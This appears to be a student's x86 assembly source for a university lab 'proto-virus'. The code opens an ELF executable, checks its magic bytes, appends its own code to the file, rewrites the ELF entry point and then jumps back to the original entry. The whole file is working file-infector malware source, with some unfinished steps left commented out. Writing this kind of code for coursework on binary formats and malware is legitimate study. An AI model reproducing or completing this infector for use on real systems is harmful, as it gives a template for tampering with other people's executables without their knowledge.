


section .rodata
format_str_s:                 db "%s",10,0
format_str_i:                 db "%d",10,0
format_str_hex:               db "%X",10,0
format_str_hex_noNewline:     db "%X",0
format_str_s_noNewline:       db "%s",0
EAX_message: db "EAX:" , 0
EBX_message: db "EBX:" , 0
ECX_message: db "ECX:" , 0
EDX_message: db "EDX:" , 0


%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define BUF_OFF 
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	PHDR_flag	24 
%define	BUFF_OFFSET	200


	

section .text
global _start

_start:
	;---Begining of the program- c convention
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

	;--print a message
	call get_my_loc
	sub edx,next_i-message
	mov ecx,edx
	write 1,ecx,17

	call get_my_loc
	sub edx, next_i-FileName
	mov ebx, edx
	open ebx, RDWR, 0777
	cmp eax, -1
	JLE fileProblem1
	mov dword[ebp-4], eax 

	;---see if the file is an ELF file by the magic of the file
	mov ebx, [ebp-4]
	mov ecx,ebp
	sub ecx,BUFF_OFFSET

	read [ebp-4], ecx, 100
	cmp byte [ebp-200],0x7f
	jne fileProblem1
	cmp byte [ebp-199], 'E'
	JNE fileProblem2
	cmp byte [ebp-198], 'L'
	; mov ecx,ebp
	; sub ecx,198
	; write 1,ecx,1
	JNE fileProblem3
	cmp byte [ebp-197], 'F'
	JNE fileProblem4
	pushad
	lseek [ebp-4],0,SEEK_END
	mov dword[ebp-20],eax
	popad

	;plant the virus
	call get_my_loc
	sub edx,next_i-_start
	mov ecx,edx
	write [ebp-4],ecx,virus_end-_start

	;modify entry point
	; lseek [ebp-4],0,SEEK_SET
	; mov ebx, [ebp -200]


	call get_my_loc
	sub edx,next_i-_start
	mov edi, edx
	call get_my_loc
	sub edx,next_i-virus_end
	mov esi, edx
	sub esi, edi
	mov edx, esi

	mov ecx,ebp
	sub ecx,BUFF_OFFSET
	add ecx,ENTRY
	mov eax,dword[ecx]
	mov dword[ebp-8],eax ; old entry point
	mov ebx,dword[ebp-20]
	add ebx, edx;
	
	mov dword[ecx],0x08048000+0x294
	;TODO: ask ahmed 
	pushad
	lseek [ebp-4],0,SEEK_SET
	popad
	mov ecx, ebp
	sub ecx,BUFF_OFFSET
	write [ebp-4], ecx, 52

	;task3

	; mov ebx,[ebp-BUFF_OFFSET+28] ;; e_phoff
	; add ebx,PHDR_size
	; lseek dword[ebp-4],ebx,SEEK_SET
	; mov ebx,dword[ebp-16]
    ; sub ebx,dword[ebx+PHDR_offset]
	; add ebx,virus_end-_start

	; mov ecx,ebp
	; sub ecx,500
	; ;read dword[ebp-4], ecx, PHDR_size ;writing the second program header table line
	; ;mov eax,dword[ebp-500+PHDR_filesize]
	; ;add eax,virus_end-_start
	; add dword[ecx+PHDR_filesize],ebx
	; ;	mov dword[ebp-500+PHDR_filesize],eax

	; ;mov esi,0
	; ;mov esi,dword[ebp-500+PHDR_offset]
	; mov dword[ebp-500+PHDR_offset], ecx
	; mov ebx,[ebp-BUFF_OFFSET+28] ;; e_phoff
	; add ebx,PHDR_size
	; lseek dword[ebp-4],ebx,SEEK_SET
	; write dword[ebp-4],dword[ebp-500],PHDR_size
	; write 1,message,17

	;task2
	task2:
	pushad
	lseek dword[ebp-4], -4 ,SEEK_END
	popad
	mov ecx,ebp
	sub ecx,8
	write dword[ebp-4],ecx, 4
	mov eax, dword[ebp-8]
	lseek eax, 0, SEEK_SET
	mov eax, dword[ebp-8]
	close eax
	call get_my_loc
	sub edx,next_i-PreviousEntryPoint
	mov ecx,edx
	jmp dword[ecx]


fileProblem1:
write 1,problem_message1,30
exit -1

fileProblem2:
write 1,problem_message2,30
exit -1

fileProblem3:
write 1,problem_message3,30
exit -1

fileProblem4:
write 1,problem_message4,30
exit -1

fileProblem5:
write 1,problem_message5,30
exit -1



VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

message: db "This is a virus",10 , 0 ;length=17
problem_message1: db "There was once a problem - 1",10 , 0
problem_message2: db "There was once a problem - 2",10 , 0
problem_message3: db "There was once a problem - 3",10 , 0
problem_message4: db "There was once a problem - 4",10 , 0
problem_message5: db "There was once a problem - 5",10 , 0
problem_message6: db "There was once a problem - 6",10 , 0
idodo: db "abc",0	

get_my_loc:
	call 	next_i
next_i:
    pop 	edx	
    ret

PreviousEntryPoint: dd VirusExit
virus_end: